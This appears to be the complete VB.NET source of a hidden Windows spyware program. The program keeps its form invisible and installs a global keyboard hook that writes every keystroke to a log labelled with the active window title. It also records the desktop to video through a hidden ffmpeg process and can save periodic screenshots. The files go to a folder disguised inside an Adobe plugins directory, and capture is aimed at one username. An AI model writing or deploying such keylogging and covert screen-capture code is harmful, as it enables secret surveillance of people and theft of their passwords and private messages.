Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Threading
Imports System.Management
Imports Microsoft.Win32
Imports System.Text.RegularExpressions


Public Class Form1
    Private WithEvents kbHook As New KeyboardHook
    Private WithEvents mprcProcess As Process

    Private mtmrTimer1 As Timer
    Private mtmrTimer2 As Timer
    Private mstrFolderPath As String = ""
    Private mstrUserName As String = ""
    Private mstrCurrentWindowName As String = "misc"
    Private mstrLastWindowName As String = ""
    Private mintTimerInterval1 As Integer
    Private mintTimerInterval2 As Integer
    Private mblnControlKeyDown As Boolean = False
    Private mblnShiftKeyDown As Boolean = False
    Private mblnAltKeyDown As Boolean = False
    Private mblnSessionLocked As Boolean = False
    Private mblnCaptureVideo As Boolean = True
    Private mblnCaptureImages As Boolean = False

    Private Const FFMPEG_PATH = "C:\Program Files\ffmpeg\bin\ffmpeg.exe"
    Private Const CONFIG_FILE = "config.ini"
    Private Const DEFAULT_FOLDER = "C:\\Users\\lafor\\Documents\\Adobe\\Adobe Media Encoder\\5.5.1\\Plugins\\MKL\\"
    Private Const DEFAULT_INTERVAL_1 = 200
    Private Const DEFAULT_INTERVAL_2 = 2000
    Private Const DEFAULT_USERNAME = "lafor_a"

    Protected Overrides Sub SetVisibleCore(ByVal value As Boolean)
        If Not Me.IsHandleCreated Then
            Me.CreateHandle()
            value = False
        End If
        MyBase.SetVisibleCore(value)

        SetConfig()

        'MsgBox(Environment.UserName)

        AddHandler SystemEvents.SessionSwitch, AddressOf onCheckLockState
        AddHandler SystemEvents.SessionEnding, AddressOf OnShuttingdown
        AddHandler SystemEvents.SessionEnded, AddressOf OnShutdown

        'Gets Window caption
        Dim tcbCallback1 As TimerCallback = New TimerCallback(AddressOf onGetCaption)

        'Captures the desktop to an image
        Dim tcbCallback2 As TimerCallback = New TimerCallback(AddressOf onCaptureScreen)

        Try
            'Start the timers
            mtmrTimer1 = New Timer(tcbCallback1, Nothing, 0, mintTimerInterval1)

            If mblnCaptureImages Then
                mtmrTimer2 = New Timer(tcbCallback2, Nothing, 0, mintTimerInterval2)
            End If

            'Video capture screen
            If mblnCaptureVideo Then
                StartRecording()
            End If
        Catch ex As Exception
            WriteLog(ex.Message)
        End Try
    End Sub

    Private Sub SetConfig()
        Try
            Dim srdrMyStreamReader As StreamReader = My.Computer.FileSystem.OpenTextFileReader(CONFIG_FILE)
            Dim strText As String

            strText = srdrMyStreamReader.ReadLine
            mstrFolderPath = strText

            strText = srdrMyStreamReader.ReadLine
            mstrUserName = strText

            strText = srdrMyStreamReader.ReadLine
            mintTimerInterval1 = CInt(strText)

            strText = srdrMyStreamReader.ReadLine
            mintTimerInterval2 = CInt(strText)

            strText = srdrMyStreamReader.ReadLine()
            mblnCaptureVideo = CBool(strText)

            strText = srdrMyStreamReader.ReadLine()
            mblnCaptureImages = CBool(strText)

            srdrMyStreamReader.Close()
            srdrMyStreamReader.Dispose()
        Catch ex As Exception
            WriteLog(ex.Message)
            mstrFolderPath = DEFAULT_FOLDER
            mstrUserName = DEFAULT_USERNAME
            mintTimerInterval1 = DEFAULT_INTERVAL_1
            mintTimerInterval2 = DEFAULT_INTERVAL_2
        End Try

    End Sub

    Private Sub onCaptureScreen()
        If GetUserName().IndexOf(mstrUserName) <> -1 And Not mblnSessionLocked Then
            CaptureScreen()
        End If
    End Sub

    Private Sub onGetCaption()
        If GetUserName().IndexOf(mstrUserName) <> -1 And Not mblnSessionLocked Then
            mstrCurrentWindowName = GetCaption()
        End If
    End Sub

    Private Sub onShuttingDown(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
        'WriteLog("System shutting down")
    End Sub

    Private Sub onShutDown(ByVal sender As Object, ByVal e As SessionEndedEventArgs)
        'WriteLog("System shut down")
    End Sub

    Private Sub onCheckLockState(ByVal sender As Object, ByVal e As SessionSwitchEventArgs)
        If e.Reason = SessionSwitchReason.SessionLock Then
            mblnSessionLocked = True
            If mblnCaptureVideo Then
                StopRecording()
            End If
        Else
            mblnSessionLocked = False
            If mblnCaptureVideo Then
                StartRecording()
            End If
        End If
    End Sub

    Private Sub mprcProcess_ErrorDataReceived(sender As System.Object, e As System.Diagnostics.DataReceivedEventArgs) Handles mprcProcess.ErrorDataReceived
        WriteLog(e.Data)
    End Sub

    Private Sub mprcProcess_OutputDataReceived(sender As System.Object, e As System.Diagnostics.DataReceivedEventArgs) Handles mprcProcess.OutputDataReceived
        WriteLog(e.Data)
    End Sub

    Private Sub StartRecording()

        'WriteLog("Start Recording")

        Dim strFileName As String = Date.Now.ToString("HHmmss")
        Dim strFolderName As String = Date.Now.ToString("yyyyMMdd")
        Dim psiProcInfo As New ProcessStartInfo
        Dim strCaptureSavePath As String = mstrFolderPath & "\" & strFolderName & "\"

        If Not Directory.Exists(strCaptureSavePath) Then
            Directory.CreateDirectory(strCaptureSavePath)
        End If

        Try
            psiProcInfo.FileName = FFMPEG_PATH
            psiProcInfo.Arguments = "-f gdigrab -framerate 10 -i desktop -qmax 10 " & Chr(34) & strCaptureSavePath & strFileName & ".flv" & Chr(34)
            psiProcInfo.UseShellExecute = False
            psiProcInfo.WindowStyle = ProcessWindowStyle.Hidden
            psiProcInfo.RedirectStandardError = True
            psiProcInfo.RedirectStandardOutput = True
            psiProcInfo.CreateNoWindow = True

            mprcProcess = New Process()
            mprcProcess.StartInfo = psiProcInfo
            mprcProcess.Start()
            mprcProcess.BeginOutputReadLine()
            mprcProcess.BeginErrorReadLine()
        Catch ex As Exception
            WriteLog(ex.Message)
        End Try
    End Sub


    Private Sub StopRecording()
        'WriteLog("Stop Recording")

        mprcProcess.Kill()
        mprcProcess.Dispose()

        'Dim hWnd As Integer
        'hWnd = FindWindow(Nothing, "C:\Program Files\ffmpeg\bin\ffmpeg.exe")

        'If hWnd > 0 Then
        'SetForegroundWindow(hWnd)

        'If IsIconic(hWnd) Then  'Restore if minimized
        'ShowWindow(hWnd, SW_RESTORE)
        'Else
        'ShowWindow(hWnd, SW_SHOW)
        'End If

        'MoveWindow(hWnd, 0, 0, 10, 10, True)

        'SendKeys.Send("q")
        'End If
    End Sub

    Private Sub CaptureScreen()
        Dim strFileName As String = Date.Now.ToString("HHmmss")
        Dim strFolderName As String = Date.Now.ToString("yyyyMMdd")
        Dim strCaptureSavePath As String = ""

        If mstrCurrentWindowName = "" Then
            strCaptureSavePath = mstrFolderPath & strFolderName & "\\screens\\misc"
        Else
            strCaptureSavePath = mstrFolderPath & strFolderName & "\\screens\\" & mstrCurrentWindowName
        End If

        Try
            Try
                If Not Directory.Exists(strCaptureSavePath) Then
                    Directory.CreateDirectory(strCaptureSavePath)
                End If
            Catch ex As Exception
                WriteLog(ex.Message)
                strCaptureSavePath = mstrFolderPath & strFolderName & "\\screens\\misc"
                If Not Directory.Exists(strCaptureSavePath) Then
                    Directory.CreateDirectory(strCaptureSavePath)
                End If
            End Try

            'Captures the whole desktop
            Dim bmpBitmap As Bitmap = New Bitmap( _
                                Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width),
                                Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
            Dim graGraphics As Graphics = Graphics.FromImage(bmpBitmap)

            'This line is modified to take everything based on the size of the bitmap
            graGraphics.CopyFromScreen(SystemInformation.VirtualScreen.X,
                               SystemInformation.VirtualScreen.Y,
                               0, 0, SystemInformation.VirtualScreen.Size)

            'Captures active window only
            'Dim rctRect As New RECT
            'GetWindowRect(GetForegroundWindow, rctRect)
            'Dim bmpBitmap As New Bitmap(rctRect.Right - rctRect.Left, rctRect.Bottom - rctRect.Top)
            'Dim graGraphics As Graphics = Graphics.FromImage(bmpBitmap)
            'graGraphics.CopyFromScreen(New Point(rctRect.Left, rctRect.Top), Point.Empty, bmpBitmap.Size)

            'Draw Cursor
            Dim x As Integer
            Dim y As Integer
            Dim bmpCursor As Bitmap = CaptureCursor(x, y)
            graGraphics.DrawImage(bmpCursor, x, y)
            bmpCursor.Dispose()

            'Save the image
            bmpBitmap.Save(strCaptureSavePath & "\\" & strFileName & ".png")

            'Clean up
            graGraphics.Dispose()
            bmpBitmap.Dispose()

        Catch ex As Exception
            WriteLog(ex.Message)
        End Try
    End Sub

    Private Sub kbHook_KeyUp(ByVal _strKey As System.Windows.Forms.Keys) Handles kbHook.KeyUp
        Select Case _strKey
            Case 160, 161
                mblnShiftKeyDown = False
            Case 162, 163
                mblnControlKeyDown = False
            Case 164, 165
                mblnAltKeyDown = False
        End Select
    End Sub

    Private Sub kbHook_KeyDown(ByVal _strKey As System.Windows.Forms.Keys) Handles kbHook.KeyDown
        Dim strChar As String = _strKey.ToString.ToLower()

        Select Case _strKey
            Case 8 'Backspace
                strChar = "Back"
            Case 9 'Tab
                strChar = vbTab
            Case 32 'Space
                strChar = " "
            Case 10, 13 'New Line
                strChar = vbCrLf
            Case 3, 12, 14, 15, 16, 17, 18, 19, 20, 27, 33, 34, 35, 36, 37, 38, 39,
                 40, 41, 42, 43, 44, 45, 46, 47, 91, 93, 112, 113, 114, 115, 116, 117, 118, 119,
                 120, 121, 122, 123, 124, 125, 126, 127, 144, 145, 160, 161, 162, 163, 164, 165

                If _strKey = 160 Or _strKey = 161 Then
                    mblnShiftKeyDown = True
                ElseIf _strKey = 162 Or _strKey = 163 Then
                    mblnControlKeyDown = True
                ElseIf _strKey = 164 Or _strKey = 165 Then
                    mblnAltKeyDown = True
                End If

                strChar = ""
            Case 46 'Delete
                strChar = ""
            Case 48, 96
                If _strKey = 48 And mblnShiftKeyDown Then
                    strChar = ")"
                Else
                    strChar = 0
                End If
            Case 49, 97
                If _strKey = 49 And mblnShiftKeyDown Then
                    strChar = "!"
                Else
                    strChar = 1
                End If
            Case 50, 98
                If _strKey = 50 And mblnShiftKeyDown Then
                    strChar = "@"
                Else
                    strChar = 2
                End If
            Case 51, 99
                If _strKey = 51 And mblnShiftKeyDown Then
                    strChar = "#"
                Else
                    strChar = 3
                End If
            Case 52, 100
                If _strKey = 52 And mblnShiftKeyDown Then
                    strChar = "$"
                Else
                    strChar = 4
                End If
            Case 53, 101
                If _strKey = 53 And mblnShiftKeyDown Then
                    strChar = "%"
                Else
                    strChar = 5
                End If
            Case 54, 102
                If _strKey = 54 And mblnShiftKeyDown Then
                    strChar = "^"
                Else
                    strChar = 6
                End If
            Case 55, 103
                If _strKey = 55 And mblnShiftKeyDown Then
                    strChar = "&"
                Else
                    strChar = 7
                End If
            Case 56, 104
                If _strKey = 56 And mblnShiftKeyDown Then
                    strChar = "*"
                Else
                    strChar = 8
                End If
            Case 57, 105
                If _strKey = 57 And mblnShiftKeyDown Then
                    strChar = "("
                Else
                    strChar = 9
                End If
            Case 106
                strChar = "*"
            Case 107, 187
                If (_strKey = 187 And mblnShiftKeyDown) Or _strKey = 107 Then
                    strChar = "+"
                Else
                    strChar = "="
                End If
            Case 109, 189
                If (_strKey = 189 And mblnShiftKeyDown) Or _strKey = 109 Then
                    strChar = "_"
                Else
                    strChar = "-"
                End If
            Case 110, 190
                If _strKey = 190 And mblnShiftKeyDown Then
                    strChar = ">"
                Else
                    strChar = "."
                End If
            Case 192
                If mblnShiftKeyDown Then
                    strChar = "~"
                Else
                    strChar = "`"
                End If
            Case 186
                If mblnShiftKeyDown Then
                    strChar = ":"
                Else
                    strChar = ";"
                End If
            Case 222
                If mblnShiftKeyDown Then
                    strChar = """"
                Else
                    strChar = "'"
                End If
            Case 221
                If mblnShiftKeyDown Then
                    strChar = "}"
                Else
                    strChar = "]"
                End If
            Case 219
                If mblnShiftKeyDown Then
                    strChar = "{"
                Else
                    strChar = "["
                End If
            Case 220
                If mblnShiftKeyDown Then
                    strChar = "|"
                Else
                    strChar = "\"
                End If
            Case 188
                If mblnShiftKeyDown Then
                    strChar = "<"
                Else
                    strChar = ","
                End If
            Case 111, 191
                If _strKey = 191 And mblnShiftKeyDown Then
                    strChar = "?"
                Else
                    strChar = "/"
                End If
        End Select

        If Control.IsKeyLocked(Keys.CapsLock) Or mblnShiftKeyDown Then
            strChar = strChar.ToUpper()
        End If

        'Debug.Print(_strKey & " : " & strChar)

        If GetUserName().IndexOf(mstrUserName) <> -1 And Not mblnControlKeyDown And strChar <> "" Then
            LogKeystroke(strChar)
        End If
    End Sub

    Private Sub LogKeystroke(ByVal _strKey As String)
        Dim strFileName As String = "log.txt"
        Dim strFolderName As String = Date.Now.ToString("yyyyMMdd")
        Dim strCaptureSavePath As String = mstrFolderPath & strFolderName & "\\log\\"

        'If the directory doesn't exist, create it
        If Not Directory.Exists(strCaptureSavePath) Then
            Try
                Directory.CreateDirectory(strCaptureSavePath)
            Catch ex As Exception
                WriteLog(ex.Message)
            End Try
        End If

        'If the file doesn't exist, create it
        If Not File.Exists(strCaptureSavePath & strFileName) Then
            Try
                File.Create(strCaptureSavePath & strFileName).Dispose()
            Catch ex As Exception
                WriteLog(ex.Message)
            End Try
        End If

        Try
            If _strKey.ToUpper() = "BACK" Then
                Dim srdrMyStreamReader As StreamReader = My.Computer.FileSystem.OpenTextFileReader(strCaptureSavePath & strFileName)
                Dim strText = srdrMyStreamReader.ReadToEnd

                srdrMyStreamReader.Close()
                srdrMyStreamReader.Dispose()

                Using stwMyStreamWriter As StreamWriter = File.CreateText(strCaptureSavePath & strFileName)
                    'Write the contents to the log file
                    stwMyStreamWriter.Write(Mid(strText, 1, Len(strText) - 1))

                    'Close the stream
                    stwMyStreamWriter.Close()
                    stwMyStreamWriter.Dispose()
                End Using

            Else
                Using stwMyStreamWriter As StreamWriter = File.AppendText(strCaptureSavePath & strFileName)
                    If mstrLastWindowName <> mstrCurrentWindowName Then
                        mstrLastWindowName = mstrCurrentWindowName
                        stwMyStreamWriter.Write(BuildTitle("[" & Date.Now.ToShortTimeString() & "] " & mstrCurrentWindowName))
                    End If
                    'Write the key to the log file
                    stwMyStreamWriter.Write(_strKey)

                    'Close the stream
                    stwMyStreamWriter.Close()
                    stwMyStreamWriter.Dispose()
                End Using
            End If

        Catch ex As Exception
            WriteLog(ex.Message)
        End Try
    End Sub

    Private Function BuildTitle(ByVal _strTitle As String) As String
        Dim strNewString As String = ""
        Dim strUnderline As String = ""

        strNewString = vbCrLf & vbCrLf & _strTitle & vbCrLf

        For I As Integer = 1 To Len(_strTitle)
            strUnderline = strUnderline & "-"
        Next

        BuildTitle = strNewString & strUnderline & vbCrLf

    End Function
    Private Function GetUserName()
        GetUserName = Environment.UserName
    End Function

    Private Declare Function GetForegroundWindow Lib "user32.dll" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Function SetForegroundWindow Lib "user32.dll" (ByVal hwnd As Integer) As Integer
    Private Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Declare Function GetWindowRect Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpRect As RECT) As Integer
    Private Declare Auto Function FindWindow Lib "user32.dll" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function IsIconic Lib "user32.dll" (ByVal hwnd As Integer) As Boolean
    Private Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    Private Declare Function MoveWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal bRepaint As Boolean) As Boolean

    Private makel As String

    Private Structure RECT
        Public Left As Integer
        Public Top As Integer
        Public Right As Integer
        Public Bottom As Integer
    End Structure

    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)

        Return Mid(Regex.Replace(Caption.ToString(), "[^A-Za-z0-9]", "-"), 1, 128)
    End Function

    Private Sub WriteLog(ByVal _strMsg As String)
        Using stwMyStreamWriter As StreamWriter = File.AppendText(mstrFolderPath & "\log.txt")
            'Write the contents to the log file
            stwMyStreamWriter.WriteLine("[" & Now & "] " & _strMsg)

            'Close the stream
            stwMyStreamWriter.Close()
            stwMyStreamWriter.Dispose()
        End Using
    End Sub

    <DllImport("dwmapi.dll", PreserveSig:=False)> _
    Public Shared Function DwmIsCompositionEnabled() As Boolean
    End Function

    <DllImport("dwmapi.dll", PreserveSig:=False)> _
    Public Shared Sub DwmEnableComposition(ByVal bEnable As Boolean)
    End Sub

    <DllImport("user32.dll", EntryPoint:="GetCursorInfo")> _
    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFO) As Boolean
    End Function

    <DllImport("user32.dll", EntryPoint:="CopyIcon")> _
    Public Shared Function CopyIcon(ByVal hIcon As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", EntryPoint:="GetIconInfo")> _
    Public Shared Function GetIconInfo(ByVal hIcon As IntPtr, ByRef piconinfo As ICONINFO) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure CURSORINFO
        Public cbSize As Int32
        Public flags As Int32
        Public hCursor As IntPtr
        Public ptScreenPos As Point
    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Public Structure ICONINFO
        Public fIcon As Boolean
        Public xHotspot As Int32
        Public yHotspot As Int32
        Public hbmMask As IntPtr
        Public hbmColor As IntPtr
    End Structure

    Private Shared Function CaptureCursor(ByRef x As Integer, ByRef y As Integer) As Bitmap
        Dim bmp As Bitmap
        Dim hicon As IntPtr
        Dim ci As New CURSORINFO()
        Dim icInfo As ICONINFO
        ci.cbSize = Marshal.SizeOf(ci)
        If GetCursorInfo(ci) Then
            hicon = CopyIcon(ci.hCursor)
            If GetIconInfo(hicon, icInfo) Then
                x = ci.ptScreenPos.X - CInt(icInfo.xHotspot)
                y = ci.ptScreenPos.Y - CInt(icInfo.yHotspot)
                Dim ic As Icon = Icon.FromHandle(hicon)
                bmp = ic.ToBitmap()
                ic.Dispose()
                Return bmp
            End If
        End If
        Return Nothing
    End Function
End Class

Public Class KeyboardHook

    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
    Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
    Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
    Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As UInt32
        Public scanCode As UInt32
        Public flags As KBDLLHOOKSTRUCTFlags
        Public time As UInt32
        Public dwExtraInfo As UIntPtr
    End Structure

    <Flags()> _
    Private Enum KBDLLHOOKSTRUCTFlags As UInt32
        LLKHF_EXTENDED = &H1
        LLKHF_INJECTED = &H10
        LLKHF_ALTDOWN = &H20
        LLKHF_UP = &H80
    End Enum

    Public Shared Event KeyDown(ByVal Key As Keys)
    Public Shared Event KeyUp(ByVal Key As Keys)

    Private Const WH_strKeyBOARD_LL As Integer = 13
    Private Const HC_ACTION As Integer = 0
    Private Const WM_strKeyDOWN = &H100
    Private Const WM_strKeyUP = &H101
    Private Const WM_SYSKEYDOWN = &H104
    Private Const WM_SYSKEYUP = &H105

    Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer

    Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
    Private HHookID As IntPtr = IntPtr.Zero

    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        If (nCode = HC_ACTION) Then
            Dim struct As KBDLLHOOKSTRUCT
            Select Case wParam
                Case WM_strKeyDOWN, WM_SYSKEYDOWN
                    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                Case WM_strKeyUP, WM_SYSKEYUP
                    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
            End Select
        End If
        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
    End Function

    Public Sub New()
        HHookID = SetWindowsHookEx(WH_strKeyBOARD_LL, KBDLLHookProcDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        If HHookID = IntPtr.Zero Then
            Throw New Exception("Could not set keyboard hook")
        End If
    End Sub

    Protected Overrides Sub Finalize()
        If Not HHookID = IntPtr.Zero Then
            UnhookWindowsHookEx(HHookID)
        End If
        MyBase.Finalize()
    End Sub

End Class